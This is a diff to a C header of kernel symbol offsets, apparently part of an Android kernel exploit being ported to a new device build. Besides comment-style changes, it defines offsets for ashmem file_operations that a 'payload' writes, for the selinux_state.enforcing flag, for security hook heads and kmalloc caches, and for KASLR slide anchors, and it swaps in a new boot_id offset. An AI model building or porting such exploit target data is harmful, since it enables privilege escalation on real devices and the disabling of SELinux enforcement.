@@ -36,12 +36,12 @@
 #define ASHMEM_SHOW_FDINFO_OFF      0x00c79c98ULL
 // kallsyms-finder mangles names: ashmem_fops -> ASHMEM_FOPS, ashmem_misc ->
 // ASHMEM_MISC, compat_ashmem_ioctl -> COMPAT_ASHMEM_IOCTL (verb-first).
-#define ASHMEM_MISC_OFF             0x0223ae98ULL   // struct miscdevice ashmem_misc (.data)
-#define ASHMEM_MISC_FOPS_OFF        ASHMEM_MISC_OFF // legacy alias; if payload writes fops fields through it, use ASHMEM_FOPS_OFF instead
-#define ASHMEM_FOPS_OFF             0x012c9eb8ULL   // const struct file_operations ashmem_fops (.rodata)
-#define ASHMEM_COMPAT_IOCTL_OFF     0x00c79910ULL   // compat_ashmem_ioctl
-#define ASHMEM_LLSEEK_OFF           0x00c790ecULL   // ashmem_llseek (fops->llseek is NOT noop_llseek on this build)
-#define ASHMEM_READ_ITER_OFF        0x00c79194ULL   // extra fops sanity anchor
+#define ASHMEM_MISC_OFF             0x0223ae98ULL   /* struct miscdevice ashmem_misc (.data) */
+#define ASHMEM_MISC_FOPS_OFF        ASHMEM_MISC_OFF /* legacy alias; if payload writes fops fields through it, use ASHMEM_FOPS_OFF instead */
+#define ASHMEM_FOPS_OFF             0x012c9eb8ULL   /* const struct file_operations ashmem_fops (.rodata) */
+#define ASHMEM_COMPAT_IOCTL_OFF     0x00c79910ULL   /* compat_ashmem_ioctl */
+#define ASHMEM_LLSEEK_OFF           0x00c790ecULL   /* ashmem_llseek (fops->llseek is NOT noop_llseek on this build) */
+#define ASHMEM_READ_ITER_OFF        0x00c79194ULL   /* extra fops sanity anchor */
 
 #define CONFIGFS_READ_ITER_OFF      0x004875d4ULL
 #define CONFIGFS_BIN_WRITE_ITER_OFF 0x00487b00ULL
@@ -54,8 +54,8 @@
 // DISABLE=n). Verify: disassemble selinux_status_update_setenforce
 // (VA ffffffc080636768) - it stores to selinux_state+0.
 // Boot-time anchor: selinux_enforcing_boot = 0x0207cae0 (dump-confirmed).
-#define SELINUX_STATE_OFF           0x02315e78ULL   // &selinux_state
-#define SELINUX_ENFORCING_OFF       0x02315e78ULL   // selinux_state.enforcing (+0)
+#define SELINUX_STATE_OFF           0x02315e78ULL   /* &selinux_state */
+#define SELINUX_ENFORCING_OFF       0x02315e78ULL   /* selinux_state.enforcing (+0) */
 #define SELINUX_BLOB_SIZES_OFF      0x0164d928ULL
 #define SECURITY_HOOK_HEADS_OFF     0x0164d1f0ULL
 #define KMALLOC_CACHES_OFF          0x0164cd30ULL
@@ -86,12 +86,9 @@
 #define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
 
 // ── Slide references ──
-#define SLIDE_NFULNL_LOGGER_OFF     0x020d2258ULL   // nfulnl_logger
-#define SLIDE_LOGGERS_0_1_OFF       0x020d21a8ULL   // &loggers[0][1] = loggers(0x020d21a0)+8; frankel gap to nfulnl_logger (0xb0) matches
-// SLIDE_RANDOM_BOOT_ID_DATA: no mustang kallsyms counterpart. Boot_id backing
-// store here is sysctl_bootid (0x02336e68). If a distinct object is required,
-// xref proc_do_uuid (VA ffffffc0808a4be4) in Ghidra before shipping.
-#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02249468ULL // UNVERIFIED - frankel value, TODO
+#define SLIDE_NFULNL_LOGGER_OFF     0x020d2258ULL   /* nfulnl_logger */
+#define SLIDE_LOGGERS_0_1_OFF       0x020d21a8ULL   /* &loggers[0][1] = loggers(0x020d21a0)+8; frankel gap to nfulnl_logger (0xb0) matches */
+#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02336e68ULL  /* mustang: sysctl_bootid (.bss) — replaces frankel 0x02249468 */
 #define SLIDE_INIT_TASK_OFF         INIT_TASK_OFF
 #define SLIDE_ROOT_TASK_GROUP_OFF   ROOT_TASK_GROUP_OFF
 #define SLIDE_SYSCTL_BOOTID_OFF     0x02336e68ULL
